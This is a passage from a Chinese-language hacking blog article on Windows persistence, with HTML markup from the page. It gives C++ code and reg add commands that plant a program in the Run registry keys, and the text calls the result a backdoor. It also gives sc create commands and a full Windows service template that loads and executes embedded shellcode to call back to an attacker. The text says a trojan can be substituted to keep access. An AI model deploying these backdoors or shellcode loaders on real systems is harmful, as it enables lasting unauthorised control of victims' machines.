class="code-snippet_outer">AutoRun_Startup(argv[<span class="code-snippet__number">1</span>], argv[<span class="code-snippet__number">2</span>]);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!]Please check the number of your parameters\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.1257617728531856" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/7_aqn4T2SoibHH15pG1OqicGoHeic5xw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0NENu2Cdnx6mEknCKp9oMlaoZricPiaqn4T2SoibHH15pG1OqicGoHeic5xw/640?wx_fmt=png'" data-type="png" data-w="1805"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>启动项注册表后门</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></code><code><span class="code-snippet_outer">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></code><code><span class="code-snippet_outer">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span></code><code><span class="code-snippet_outer">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">值得注意的是,HKEY_CURRENT_USER的改动不需要管理员权限</span><br  /><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">自己写的一个小工具</span></section><section style="line-height: 1.75em;"><img data-ratio="0.4820627802690583" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/8_clRLGJpRElgLoI3UM5MeS5BG4icNYQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0fohgsNiclGAYxYibsLYX6deZwxLiclRLGJpRElgLoI3UM5MeS5BG4icNYQ/640?wx_fmt=png'" data-type="png" data-w="1338"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">代码不多,也比较简单,还是分享出来：</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;iostream&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function">BOOL <span class="code-snippet__title">Reg_CurrentUser</span><span class="code-snippet__params">(<span class="code-snippet__keyword">const</span> <span class="code-snippet__keyword">char</span>* lpszFileName,<span class="code-snippet__keyword">const</span> <span class="code-snippet__keyword">char</span>* lpszValueName)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//定义一个注册表句柄</span></span></code><code><span class="code-snippet_outer">HKEY hKey;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//打开注册表键</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, <span class="code-snippet__string">L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>, <span class="code-snippet__number">0</span>, KEY_WRITE, &amp;hKey))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+] Open RegKey Successfully\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!] Open RegKey Error\n"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (ERROR_SUCCESS == ::RegSetValueExA(hKey, lpszValueName, <span class="code-snippet__number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="code-snippet__number">1</span> + ::lstrlenA(lpszFileName))))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+] Set Value Successfully\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">::RegCloseKey(hKey);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!] Set Value Error\n"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+] The registry backdoor about HKEY_CURRENT_USER is generated successfully\n"</span>);</span></code><code><span class="code-snippet_outer">::RegCloseKey(hKey);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> TRUE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>* argv[])</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[*]Useage:\n    %s %s %s\n"</span>,<span class="code-snippet__string">"ModifyReg.exe"</span>,<span class="code-snippet__string">"E:\\010Editor\\010 Editor\\010Editor.exe"</span>, <span class="code-snippet__string">"010Editor"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (argc == <span class="code-snippet__number">3</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">Reg_CurrentUser(argv[<span class="code-snippet__number">1</span>], argv[<span class="code-snippet__number">2</span>]);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!]Please check the number of your parameters\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">而更改HKEY_LOCAL_MACHINE却是需要管理员权限</span><br  /><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section style="line-height: 1.75em;"><img data-ratio="0.4388152766952455" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/9_lp8Nsj8LDkqqXLhlSBmTNfcGaTIM3A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0hCCRmvvQ5toyYuzBmzj2PmW0lp8Nsj8LDkqqXLhlSBmTNfcGaTIM3A/640?wx_fmt=png'" data-type="png" data-w="1283"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">重启后exe会自启,不一定是cmd程序,可以换成我们自己的马,达到维持权限的效果</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>使用命令行</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">修改HKLM</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">add</span> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v <span class="code-snippet__string">"123"</span> /t REG_SZ /d <span class="code-snippet__string">"C:\Windows\System32\cmd.exe"</span> /f</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">同样需要管理员权限,代码跟上面差不多</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.35571955719557197" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/10_OjLCSVToSzRadANa8GCdFY9ou0ZwtQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0H1j1KyUmjdLBw0eLxbmotVsBOjLCSVToSzRadANa8GCdFY9ou0ZwtQ/640?wx_fmt=png'" data-type="png" data-w="1355"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">HKEY_CURRENT_USER同理,但不需要管理员权限</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.5364188163884673" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/11_bVTqMjBQ0bHASALrWa8nnWVONJjeSw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0v28TG9jc8PvOZ18iarsybgGdRbVTqMjBQ0bHASALrWa8nnWVONJjeSw/640?wx_fmt=png'" data-type="png" data-w="1318"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>自启动服务后门</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">可以通过如下命令行方式添加一个服务</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">sc <span class="code-snippet__keyword">create</span> <span class="code-snippet__string">"SD"</span> binpath=   <span class="code-snippet__string">"C:\Users\SD\Desktop\test.exe"</span></span></code><code><span class="code-snippet_outer">sc description <span class="code-snippet__string">"SD"</span>   <span class="code-snippet__string">"description"</span> 设置服务的描述字符串</span></code><code><span class="code-snippet_outer">sc config <span class="code-snippet__string">"SD"</span>   <span class="code-snippet__keyword">start</span>= <span class="code-snippet__keyword">auto</span>  设置这个服务为自动启动</span></code><code><span class="code-snippet_outer">net <span class="code-snippet__keyword">start</span> <span class="code-snippet__string">"SD"</span>   启动服务</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">也可以直接编写一个服务,穿插着shellcode上线</span><br  /><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;iostream&gt;</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">char</span> buf[] =<span class="code-snippet__string">"\xfc\xe8\x89\x00\x00...............................................\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78"</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">define</span> SLEEP_TIME 5000                          <span class="code-snippet__comment">/*间隔时间*/</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">define</span> LOGFILE <span class="code-snippet__meta-string">"C:\\Windows\\log1.txt"</span>              <span class="code-snippet__comment">/*信息输出文件*/</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">SERVICE_STATUS ServiceStatus;  <span class="code-snippet__comment">/*服务状态*/</span></span></code><code><span class="code-snippet_outer">SERVICE_STATUS_HANDLE hStatus; <span class="code-snippet__comment">/*服务状态句柄*/</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">void</span>  <span class="code-snippet__title">ServiceMain</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>** argv)</span></span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">void</span>  <span class="code-snippet__title">CtrlHandler</span><span class="code-snippet__params">(DWORD request)</span></span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span>   <span class="code-snippet__title">InitService</span><span class="code-snippet__params">()</span></span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, CHAR* argv[])</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">WCHAR WserviceName[] = TEXT(<span class="code-snippet__string">"sddd"</span>);</span></code><code><span class="code-snippet_outer">SERVICE_TABLE_ENTRY ServiceTable[<span class="code-snippet__number">2</span>];</span></code><code><span class="code-snippet_outer">ServiceTable[<span class="code-snippet__number">0</span>].lpServiceName = WserviceName;</span></code><code><span class="code-snippet_outer">ServiceTable[<span class="code-snippet__number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;</span></code><code><span class="code-snippet_outer">ServiceTable[<span class="code-snippet__number">1</span>].lpServiceName = <span class="code-snippet__literal">NULL</span>;</span></code><code><span class="code-snippet_outer">ServiceTable[<span class="code-snippet__number">1</span>].lpServiceProc = <span class="code-snippet__literal">NULL</span>;</span></code><code><span class="code-snippet_outer">StartServiceCtrlDispatcher(ServiceTable);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">WriteToLog</span><span class="code-snippet__params">(<span class="code-snippet__keyword">const</span> <span class="code-snippet__keyword">char</span>* str)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">FILE* pfile;</span></code><code><span class="code-snippet_outer">fopen_s(&amp;pfile, LOGFILE, <span class="code-snippet__string">"a+"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (pfile == <span class="code-snippet__literal">NULL</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__number">-1</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">fprintf_s(pfile, <span class="code-snippet__string">"%s\n"</span>, str);</span></code><code><span class="code-snippet_outer">fclose(pfile);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/*Service initialization*/</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">InitService</span><span class="code-snippet__params">()</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">CHAR Message[] = <span class="code-snippet__string">"Monitoring started."</span>;</span></code><code><span class="code-snippet_outer">OutputDebugString(TEXT(<span class="code-snippet__string">"Monitoring started."</span>));</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">int</span> result;</span></code><code><span class="code-snippet_outer">result = WriteToLog(Message);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>(result);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/*Control Handler*/</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">void</span> <span class="code-snippet__title">CtrlHandler</span><span class="code-snippet__params">(DWORD request)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">switch</span> (request)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">case</span> SERVICE_CONTROL_STOP:</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">WriteToLog(<span class="code-snippet__string">"Monitoring stopped."</span>);</span></code><code><span class="code-snippet_outer">ServiceStatus.dwWin32ExitCode = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus, &amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">case</span> SERVICE_CONTROL_SHUTDOWN:</span></code><code><span class="code-snippet_outer">WriteToLog(<span class="code-snippet__string">"Monitoring stopped."</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">ServiceStatus.dwWin32ExitCode = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus, &amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">default</span>:</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/* Report current status  */</span></span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus, &amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">void</span> <span class="code-snippet__title">ServiceMain</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>** argv)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">WCHAR WserviceName[] = TEXT(<span class="code-snippet__string">"sddd"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">int</span> error;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwServiceType =</span></code><code><span class="code-snippet_outer">SERVICE_WIN32;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState =</span></code><code><span class="code-snippet_outer">SERVICE_START_PENDING;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span></span></code><code><span class="code-snippet_outer">ServiceStatus.dwControlsAccepted =</span></code><code><span class="code-snippet_outer">SERVICE_ACCEPT_SHUTDOWN |</span></code><code><span class="code-snippet_outer">SERVICE_ACCEPT_STOP;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwWin32ExitCode = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwServiceSpecificExitCode = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwCheckPoint = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwWaitHint = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">hStatus = ::RegisterServiceCtrlHandler(</span></code><code><span class="code-snippet_outer">WserviceName,</span></code><code><span class="code-snippet_outer">(LPHANDLER_FUNCTION)CtrlHandler);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">WriteToLog(<span class="code-snippet__string">"RegisterServiceCtrlHandler failed"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">WriteToLog(<span class="code-snippet__string">"RegisterServiceCtrlHandler success"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/* Initialize Service   */</span></span></code><code><span class="code-snippet_outer">error = InitService();</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (error)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/* Initialization failed  */</span></span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState =</span></code><code><span class="code-snippet_outer">SERVICE_STOPPED;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwWin32ExitCode = <span class="code-snippet__number">-1</span>;</span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus, &amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">LPVOID Memory = VirtualAlloc(<span class="code-snippet__literal">NULL</span>, <span class="code-snippet__keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">memcpy</span>(Memory, buf, <span class="code-snippet__keyword">sizeof</span>(buf));</span></code><code><span class="code-snippet_outer">((<span class="code-snippet__keyword">void</span>(*)())Memory)();</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/*向SCM 报告运行状态*/</span></span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState =</span></code><code><span class="code-snippet_outer">SERVICE_RUNNING;</span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus, &amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">/*do something you want to do in this while loop*/</span></span></code><code><span class="code-snippet_outer">MEMORYSTATUS memstatus;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">while</span> (ServiceStatus.dwCurrentState ==</span></code><code><span class="code-snippet_outer">SERVICE_RUNNING)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">char</span> buffer[<span class="code-snippet__number">16</span>];</span></code><code><span class="code-snippet_outer">GlobalMemoryStatus(&amp;memstatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="code-snippet__number">1024</span> / <span class="code-snippet__number">1024</span>;</span></code><code><span class="code-snippet_outer">sprintf_s(buffer, <span class="code-snippet__number">100</span>, <span class="code-snippet__string">"available memory is %dMB"</span>, availmb);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">int</span> result = WriteToLog(buffer);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (result)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span></code><code><span class="code-snippet_outer">ServiceStatus.dwWin32ExitCode = <span class="code-snippet__number">-1</span>;</span></code><code><span class="code-snippet_outer">SetServiceStatus(hStatus,</span></code><code><span class="code-snippet_outer">&amp;ServiceStatus);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">Sleep(SLEEP_TIME);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">WriteToLog(<span class="code-snippet__string">"service stopped"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span>;</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">这其实也是psexec的原理:建立连接后创建服务反弹shell</span></section><section style="line-height: 1.75em;"><img data-ratio="0.608214849921011" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/12_BKMulwqWIthYenias4hVIg0gicKUTw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0JvoNh977qT8uePzSJonWcIvRxKBKMulwqWIthYenias4hVIg0gicKUTw/640?wx_fmt=png'" data-type="png" data-w="1266"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">删除服务:</span><br  /></section><section class="code-snippet__fix 